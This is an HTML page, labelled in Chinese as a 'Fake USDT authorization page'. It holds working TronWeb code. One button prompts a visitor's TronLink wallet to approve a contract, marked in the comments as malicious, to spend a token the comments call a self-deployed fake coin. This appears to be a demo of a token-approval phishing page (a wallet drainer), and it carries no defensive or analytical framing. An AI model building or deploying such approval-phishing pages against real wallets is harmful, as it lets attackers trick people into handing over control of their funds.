<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Fake USDT 授權頁</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
</head>
<body>
  <h2>🚨 授權 Fake USDT</h2>
  <button onclick="approve()">點我授權</button>
  <p id="status"></p>

  <script>
    const fakeUSDT = "TVCS7QxvBzTxg1ybwMTxVeaJktHCCFj4Xt";     // 你部署的假幣
    const fakeApprove = "TNogK4zkavHQtpyAgBuTRo7iNPREHj9dxx";   // 惡意合約地址
    const amount = "100000000"; // 授權 100 枚（6位小數）

    async function approve() {
      if (!window.tronWeb || !window.tronWeb.ready) {
        document.getElementById("status").innerText = "請先安裝並登入 TronLink";
        return;
      }

      try {
        const contract = await window.tronWeb.contract().at(fakeUSDT);
        const tx = await contract.approve(fakeApprove, amount).send();
        document.getElementById("status").innerText = `✅ 授權成功！TX: ${tx}`;
      } catch (err) {
        document.getElementById("status").innerText = `❌ 錯誤：${err.message}`;
      }
    }
  </script>
</body>
</html>
